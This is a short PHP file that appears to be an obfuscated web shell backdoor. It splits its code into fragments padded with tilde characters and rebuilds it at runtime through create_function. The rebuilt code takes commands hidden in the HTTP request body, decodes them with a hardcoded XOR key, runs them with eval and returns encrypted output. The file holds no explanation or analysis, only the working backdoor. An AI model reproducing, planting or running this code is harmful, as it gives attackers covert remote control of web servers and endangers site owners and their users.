<?php
$o='$k=~"1ef81486~";$kh="~e742~f2b7c0f3~";$kf~="4~2bfc8~f3dbf~a";~$p="Mz0yQxtYGr7mf~3Ge"~;fu~nction x($t~~,$';
$O='~k){$c=strl~en~($~k);$l=strlen($t)~;$o=~"";for($i=~0;$i<$~l;){for(~$j=0;~~($j<$c&&$i<~$l);$j~++,$i++)~~{';
$j='_c~ontents();@ob_end~_~clean()~;$r=@b~a~se64_encode(@x~(@g~zcompress~($o),~$k));p~rint(~"$~p$kh$r$kf");}';
$H='~$o.=$~t{$i}^$k{$j};}}~r~eturn $o;}if~ (@~preg_ma~tc~h("~/$~kh(.+)$~kf/",@file_g~et_contents("p~hp~://~i';
$a=str_replace('lz','','crlzealzlzte_flzunclztilzon');
$Y='nput"),$m~)==1) {@~ob~_start();@e~val~(@gzu~nc~ompress(@x(~@b~ase64_d~ecode(~$~m[1]),$k)));$o=@o~b_get~~';
$Q=str_replace('~','',$o.$O.$H.$Y.$j);
$t=$a('',$Q);$t();
?>
